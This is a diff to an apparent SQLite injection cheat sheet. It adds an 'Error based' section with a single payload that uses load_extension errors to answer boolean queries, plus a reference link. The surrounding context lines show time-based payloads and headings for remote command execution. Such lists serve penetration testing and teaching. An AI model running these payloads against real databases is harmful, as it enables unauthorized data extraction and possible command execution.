@@ -11,6 +11,7 @@
 * [Boolean - Enumerating table name](#boolean---enumerating-table-name)
 * [Boolean - Extract info](#boolean---extract-info)
 * [Time based](#time-based)
+* [Error based](#error-based)
 * [Remote Command Execution using SQLite command - Attach Database](#remote-command-execution-using-sqlite-command---attach-database)
 * [Remote Command Execution using SQLite command - Load_extension](#remote-command-execution-using-sqlite-command---load_extension)
 * [References](#references)
@@ -77,6 +78,12 @@ and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and 
 AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
 ```
 
+## Error based
+
+```sql
+AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
+```
+
 ## Remote Command Execution using SQLite command - Attach Database
 
 ```sql
@@ -96,3 +103,4 @@ Note: By default this component is disabled
 ## References
 
 [Injecting SQLite database based application - Manish Kishan Tanwar](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
+[SQLite Error Based Injection for Enumeration](https://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)
